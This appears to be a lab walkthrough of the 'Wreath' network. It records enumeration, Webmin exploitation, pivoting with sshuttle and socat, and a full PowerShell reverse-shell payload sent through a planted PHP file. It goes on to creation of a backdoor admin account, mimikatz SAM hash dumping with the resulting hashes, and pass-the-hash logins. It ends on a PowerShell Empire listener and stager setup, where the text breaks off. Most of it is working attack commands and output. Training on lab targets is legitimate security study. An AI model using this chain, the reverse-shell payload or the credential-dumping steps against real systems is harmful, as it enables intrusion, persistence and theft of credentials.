# IP Address
**The IP address kept on changing due to the resetting of machine again & again and long time to complete the walkthrough**
- 10.200.84.200

# Enumeration
## Webserver
### Nmap
```console
❯ nmap -sC -sV -o -p-15000  10.200.84.200 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 17:32 IST
Nmap scan report for 10.200.84.200
Host is up (0.17s latency).
Not shown: 14806 filtered tcp ports (no-response), 189 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2022-08-18T11:43:31
|_Not valid after:  2023-08-18T11:43:31
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_ssl-date: TLS randomness does not represent time
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (90%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 236.44 seconds
```
- Found 4 ports to be open 
- Found the OS to be CentOS on the host machine
- The web server is running on MiniServ 1.890 (Webmin httpd) which is vulnerable to CVE-2019-15107

### Web page
#### Personal Informartion
1. *Mobile number* - +447821548812 
2. *Phone number*  -  01347 822945 
3. *Email id* - me@thomaswreath.thm
4. *Address* - 21 Highland Court, Easingwold,East Riding, Yorkshire, England, YO61 3QL 

# Exploitaion
## Web Server
1. Exploited system with `https://github.com/MuirlandOracle/CVE-2019-15107.git`.
2. The server was found to be running on root, do privelege escalaition was not required. 
3. Found `id_rsa` file in `/root/ssh/id_rsa`.
4. Saved key to local machine and gained persistant access to the box

## Git Server
### Enumeration
1. Loaded nmap on the compromised machine for further enumeration and scanned all the devices available on the network
```console
[root@prod-serv tmp]# ./nmap-divu050704 -sn 10.200.90.1-255 -oN scan-divu050704

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-26 14:07 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-90-1.eu-west-1.compute.internal (10.200.90.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00051s latency).
MAC Address: 02:A7:A9:75:56:EB (Unknown)
Nmap scan report for ip-10.200.84.100.eu-west-1.compute.internal (10.200.90.100)
Host is up (0.00033s latency).
MAC Address: 02:B8:E1:83:8E:EF (Unknown)
Nmap scan report for ip-10.200.84.150.eu-west-1.compute.internal (10.200.90.150)
Host is up (-0.10s latency).
MAC Address: 02:2F:36:04:FB:F1 (Unknown)
Nmap scan report for ip-10-200-90-250.eu-west-1.compute.internal (10.200.90.250)
Host is up (0.00046s latency).
MAC Address: 02:5C:30:38:02:5F (Unknown)
Nmap scan report for ip-10.200.84.200.eu-west-1.compute.internal (10.200.90.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.74 seconds
```
2. Found three device runnning on the netowrk apart from the entry point and the comromised device itself.
3. On enumerating each device found that some ports were open on the device with ip `10.200.84.150`
```console
[root@prod-serv tmp]# ./nmap-divu050704 10.200.84.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-26 14:13 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10.200.84.150.eu-west-1.compute.internal (10.200.90.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00050s latency).
Not shown: 6147 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
MAC Address: 02:2F:36:04:FB:F1 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 73.26 seconds
```
### Exploitation 
1. Pivoted to the network with sshittle
```console
❯ sshuttle -r root@10.200.84.200 --ssh-cmd "ssh -i id_rsa" 10.200.90.0/24 -x  10.200.90.200
c : Connected to server.
```
2. On going to url http://10.200.84.150 found out that the service running was `gitstack`
```console
❯ curl http://10.200.84.150

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
      <td>http://10.200.84.150/</td>
      </tr>
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>app.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                ^registration/login/$
                
            
          </li>
        
          <li>
            
                ^gitstack/
                
            
          </li>
        
          <li>
            
                ^rest/
                
            
          </li>
        
      </ol>
      <p>The current URL, <code></code>, didn't match any of these.</p>
    
  </div>

  <div id="explanation">
    <p>
      You're seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```
3. On going to `http://10.200.84.150/gitstack` a login screen is presented with displaying default username and password as `admin`, `admin`  respectively, but found out to be changed on this device.
4. Pivoted on the network by loading socat on the compromised machine `10.200.84.200`
```console
[root@prod-serv tmp]# ./socat-divu050704 tcp-l:15999 tcp:10.50.91.100:8080 &
[1] 2337
```
5. Started a netcat listener on the attacking machine
```console
❯ nc -lvnp 8080
listening on [any] 8080 ...
```
6. Sent the reverse shell command to `10.200.84.150`
```console
❯ curl -X POST http://10.200.84.150/web/exploit-divu050704.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.84.200%27%2C15999%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```
7. Caught the reverse shell and stabalized it 
```console
❯ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.50.91.100] from (UNKNOWN) [10.200.84.200] 35144
l
PS C:\GitStack\gitphp> ls


    Directory: C:\GitStack\gitphp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       08/11/2020     13:28                cache                                                                 
d-----       08/11/2020     13:29                config                                                                
d-----       08/11/2020     13:28                css                                                                   
d-----       08/11/2020     13:28                doc                                                                   
d-----       08/11/2020     13:28                images                                                                
d-----       08/11/2020     13:28                include                                                               
d-----       08/11/2020     13:28                js                                                                    
d-----       08/11/2020     13:28                lib                                                                   
d-----       08/11/2020     13:28                locale                                                                
d-----       08/11/2020     13:28                templates                                                             
d-----       08/11/2020     13:28                templates_c                                                           
-a----       27/08/2022     05:34             34 exploit-divu050704.php                                                
-a----       27/08/2022     05:32             34 exploit.php                                                           
-a----       25/08/2022     17:44             34 exploit123.php                                                        
-a----       16/05/2012     14:20           5742 index.php                                                             


PS C:\GitStack\gitphp> 

```
8. After pivoting we can access a stable shell with winrm 
9. First on the compromised machine make a new user.
```console
PS C:\GitStack\gitphp> net user divu050704 123 /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators divu050704 /add            
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" divu050704 /add
The command completed successfully.
```
10. Then with winrm connect from the attacking machine to the comromised machine
```console
❯ evil-winrm -u divu050704 -p 123 -i 10.200.84.150

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\divu050704\Documents> ls
*Evil-WinRM* PS C:\Users\divu050704\Documents> ls
*Evil-WinRM* PS C:\Users\divu050704\Documents> pwd

Path
----
C:\Users\divu050704\Documents
```
11. This shell cannot run Administrator commands so we will get a gui session with rdp
```console
❯ xfreerdp /v:10.200.84.150 /u:divu050704 /p:123 /dynamic-resolution /drive:/usr/share/windows-resources,share
[18:46:18:069] [20044:20045] [INFO][com.freerdp.crypto] - creating directory /home/divu050704/.config/freerdp
[18:46:18:070] [20044:20045] [INFO][com.freerdp.crypto] - creating directory [/home/divu050704/.config/freerdp/certs]
[18:46:18:070] [20044:20045] [INFO][com.freerdp.crypto] - created directory [/home/divu050704/.config/freerdp/server]
[18:46:18:437] [20044:20045] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[18:46:18:438] [20044:20045] [WARN][com.freerdp.crypto] - CN = git-serv
[18:46:18:439] [20044:20045] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[18:46:18:440] [20044:20045] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[18:46:18:440] [20044:20045] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[18:46:18:440] [20044:20045] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.200.84.150:3389) 
[18:46:18:440] [20044:20045] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[18:46:18:440] [20044:20045] [ERROR][com.freerdp.crypto] - Common Name (CN):
[18:46:18:440] [20044:20045] [ERROR][com.freerdp.crypto] -      git-serv
[18:46:18:440] [20044:20045] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.200.84.150:3389 (RDP-Server):
        Common Name: git-serv
        Subject:     CN = git-serv
        Issuer:      CN = git-serv
        Thumbprint:  ee:cf:50:56:bd:32:08:2b:18:af:0a:d4:24:1d:c2:41:06:08:76:94:26:26:3b:89:46:ca:02:a0:e8:c3:30:0d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```
12. On our gui rdb started mimikatz
```console
C:\Windows\system32>\tsclient\share\mimikatz\x64\mimikatz.exe
            .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
           .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
           ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
           ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
           '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
            '#####'        > https://pingcastle.com / https://mysmartlogon.com *** /                                                                                                                                                                               
```
13. With mimikatz check that the user is running as Admin
```console
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
Token Id  : 0            
User name :                                                                                                                  
SID name  : NT AUTHORITY\SYSTEM
672     {0;000003e7} 1 D 20118          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
-> Impersonated !
* Process Token : {0;000ca3da} 2 F 1890652     GIT-SERV\divu050704     S-1-5-21-3335744492-1614955177-2693036043-1002 
(15g,24p)       Primary
* Thread Token  : {0;000003e7} 1 D 1932547     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation(Delegation)                                                                                                                                                               

```
14. After getting making sure that the user has admin permissions we can no dump password hashes of the users
```console
mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 68b1608793104cca229de9f1dfb6fbae

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-1696O63F791Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
      des_cbc_md5       (4096) : e3915234101c6b75

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-1696O63F791Administrator
    Credentials
      des_cbc_md5       : e3915234101c6b75


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e389f51da73551518c3c2096c0720233

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
      des_cbc_md5       (4096) : b6f1bac2346d9e2c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : b6f1bac2346d9e2c


RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03126107c740a83797806c207553cef7

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVThomas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
      des_cbc_md5       (4096) : e5add55e76751fbc
    OldCredentials
      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
      des_cbc_md5       (4096) : 7f16a47cef890b3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVThomas
    Credentials
      des_cbc_md5       : e5add55e76751fbc
    OldCredentials
      des_cbc_md5       : 7f16a47cef890b3b


RID  : 000003ea (1002)
User : divu050704
  Hash NTLM: 3dbde697d71690a769204beb12283678

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ac90380fc711109e7ccb89ccf8522c27

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVdivu050704
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 56b1f9a0eba526c1199a91940cee44c567739a5f931d7fbfa2d32983f871ba7e
      aes128_hmac       (4096) : ac2552be062d39e72d36ec63ed3273d0
      des_cbc_md5       (4096) : fed5b0c84983165d

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVdivu050704
    Credentials
      des_cbc_md5       : fed5b0c84983165d


mimikatz #
```
15. With hashed token of device `10.200.85.150` `Administrator` connect with `evil-winrm`
```console
❯ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
### Command and Control 

1. Start `powershell-empire` server
```console
❯ sudo powershell-empire server
[sudo] password for divu050704: 
[*] Loading default config
[*] Loading bypasses from: /usr/share/powershell-empire/empire/server/bypasses/
[*] Loading stagers from: /usr/share/powershell-empire/empire/server/stagers/
[*] Loading modules from: /usr/share/powershell-empire/empire/server/modules/
[*] Loading listeners from: /usr/share/powershell-empire/empire/server/listeners/
[*] Starting listener 'CLIHTTP'
[+] Listener successfully started!
[*] Loading malleable profiles from: /usr/share/powershell-empire/empire/server/data/profiles
[*] Searching for plugins at /usr/share/powershell-empire/empire/server/plugins/
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading Empire C# server plugin
[*] Registering plugin with menu...
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading Empire reverseshell server plugin
[*] Registering plugin with menu...
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading websockify server plugin
[*] Registering plugin with menu...
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading Empire Socks Proxy Server plugin
[*] Registering plugin with menu...
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading Chisel server plugin
[*] Registering plugin with menu...
[*] Empire starting up...
[*] Starting Empire RESTful API on 0.0.0.0:1337
[*] Starting Empire SocketIO on 0.0.0.0:5000
[*] Testing APIs
[+] Empire RESTful API successfully started
[+] Empire SocketIO successfully started
```
2. Start `powershell-empire` client.
```console
❯ powershell-empire client
[*] Loading default config
pygame 2.1.2 (SDL 2.0.22, Python 3.10.4)
Hello from the pygame community. https://www.pygame.org/contribute.html
                              
                              /`/`/`/`/`/`/`/`/`
                         ``````.--::///+
                     ````-+sydmmmNNNNNNN
                   ``./ymmNNNNNNNNNNNNNN
                 ``-ymmNNNNNNNNNNNNNNNNN
               ```ommmmNNNNNNNNNNNNNNNNN
              ``.ydmNNNNNNNNNNNNNNNNNNNN
             ```odmmNNNNNNNNNNNNNNNNNNNN
            ```/hmmmNNNNNNNNNNNNNNNNMNNN
           ````+hmmmNNNNNNNNNNNNNNNNNMMN
          ````..ymmmNNNNNNNNNNNNNNNNNNNN
          ````:.+so+//:---.......----::-
         `````.`````````....----:///++++
        ``````.-/osy+////:::---...-dNNNN
        ````:sdyyydy`         ```:mNNNNM
       ````-hmmdhdmm:`      ``.+hNNNNNNM
       ```.odNNmdmmNNo````.:+yNNNNNNNNNN
       ```-sNNNmdh/dNNhhdNNNNNNNNNNNNNNN
       ```-hNNNmNo::mNNNNNNNNNNNNNNNNNNN
       ```-hNNmdNo--/dNNNNNNNNNNNNNNNNNN
      ````:dNmmdmd-:+NNNNNNNNNNNNNNNNNNm
      ```/hNNmmddmd+mNNNNNNNNNNNNNNds++o
     ``/dNNNNNmmmmmmmNNNNNNNNNNNmdoosydd
     `sNNNNdyydNNNNmmmmmmNNNNNmyoymNNNNN
     :NNmmmdso++dNNNNmmNNNNNdhymNNNNNNNN
     -NmdmmNNdsyohNNNNmmNNNNNNNNNNNNNNNN
     `sdhmmNNNNdyhdNNNNNNNNNNNNNNNNNNNNN
       /yhmNNmmNNNNNNNNNNNNNNNNNNNNNNmhh
        `+yhmmNNNNNNNNNNNNNNNNNNNNNNmh+:
          `./dmmmmNNNNNNNNNNNNNNNNmmd.
            `ommmmmNNNNNNNmNmNNNNmmd:
             :dmmmmNNNNNmh../oyhhhy:
             `sdmmmmNNNmmh/++-.+oh.
              `/dmmmmmmmmdo-:/ossd:
                `/ohhdmmmmmmdddddmh/
                   `-/osyhdddddhyo:
                        ``.----.`

                Welcome to the Empire

========================================================================================
 [Empire] Post-Exploitation Framework
========================================================================================
 [Version] 4.7.1 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
========================================================================================
 [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
========================================================================================
 [Documentation] | [Web] https://bc-security.gitbook.io/empire-wiki/
========================================================================================

   _______   ___  ___   ______    __   ______        _______
  |   ____| |   \/   | |   _  \  |  | |   _  \      |   ____|
  |  |__    |  \  /  | |  |_)  | |  | |  |_)  |     |  |__
  |   __|   |  |\/|  | |   ___/  |  | |      /      |   __|
  |  |____  |  |  |  | |  |      |  | |  |\  \----. |  |____
  |_______| |__|  |__| | _|      |__| | _| `._____| |_______|


       409 modules currently loaded

       0 listeners currently active

       0 agents currently active

[*] Connected to localhost
(Empire) >

```

3. Start listener in the client 
```console
(Empire) > uselistener http

 Author       @harmj0y                                                              
 Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST 
              approach.                                                             
 Name         HTTP[S]                                                               


┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value                               │ Required │ Description                         │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
│                  │                                     │          │ server.                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ CertPath         │                                     │ False    │ Certificate path for https          │
│                  │                                     │          │ listeners.                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Cookie           │ mBKzniWrXOXvi                       │ False    │ Custom Cookie Name                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultDelay     │ 5                                   │ True     │ Agent delay/reach back interval (in │
│                  │                                     │          │ seconds).                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  │
│                  │                                     │          │ (0.0-1.0).                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    │
│                  │                                     │          │ exiting                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   │
│                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          │
│                  │ 6.1; WOW64; Trident/7.0; rv:11.0)   │          │                                     │
│                  │ like Gecko                          │          │                                     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Host             │ http://10.50.85.113:8000            │ True     │ Hostname/IP for staging.            │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
│                  │                                     │          │ using TLS ciphers.                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ KillDate         │                                     │ False    │ Date for the listener to exit       │
│                  │                                     │          │ (MM/dd/yyyy).                       │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Name             │ CLIHTTP                             │ True     │ Name for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Port             │ 8000                                │ True     │ Port for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  │
│                  │                                     │          │ none, or other).                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
│                  │                                     │          │ ([domain\]username:password) to use │
│                  │                                     │          │ for request (default, none, or      │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
│                  │                                     │          │ communicate with your Slack         │
│                  │                                     │          │ instance.                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerURI        │                                     │ False    │ URI for the stager. Must use        │
│                  │                                     │          │ /download/. Example:                │
│                  │                                     │          │ /download/stager.php                │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagingKey       │ [G,8&CH]<4um|YW/>Mj;eXLDpwdI:lfV    │ True     │ Staging key for initial agent       │
│                  │                                     │          │ negotiation.                        │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default                             │ False    │ User-agent string to use for the    │
│                  │                                     │          │ staging request (default, none, or  │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      │
│                  │                                     │          │ (09:00-17:00).                      │
└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: uselistener/http) > set Name CLIHTTP
[*] Set Name to CLIHTTP
(Empire: uselistener/http) > set Host 10.50.85.113
[*] Set Host to 10.50.85.113
(Empire: uselistener/http) > set Port 8000
[*] Set Port to 8000
(Empire: uselistener/http) > execute
[+] Listener CLIHTTP successfully started
(Empire: uselistener/http) >

```
5. Set stager on client 
```console
(Empire: uselistener/http) > usestager multi/bash

 Author       @harmj0y                                                         
 Description  Generates self-deleting Bash script to execute the Empire stage0 
              launcher.                                                        
 Name         multi/bash                                                       


┌Record Options───────────────────┬──────────┬─────────────────────────────────────┐
│ Name       │ Value              │ Required │ Description                         │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses   │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│            │                    │          │ to be prepended to the launcher     │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Language   │ python             │ True     │ Language of the stager to generate. │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener   │                    │ True     │ Listener to generate stager for.    │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ OutFile    │                    │ False    │ Filename that should be used for    │
│            │                    │          │ the generated output, otherwise     │
│            │                    │          │ returned as a string.               │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ SafeChecks │ True               │ True     │ Switch. Checks for LittleSnitch or  │
│            │                    │          │ a SandBox, exit the staging process │
│            │                    │          │ if true. Defaults to True.          │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent  │ default            │ False    │ User-agent string to use for the    │
│            │                    │          │ staging request (default, none, or  │
│            │                    │          │ other).                             │
└────────────┴────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: usestager/multi/bash) > set Listener CL
[*] Set Listener to CL
(Empire: usestager/multi/bash) > set Listener CLIHTTP
[*] Set Listener to CLIHTTP
(Empire: usestager/multi/bash) > execute
#!/bin/bash
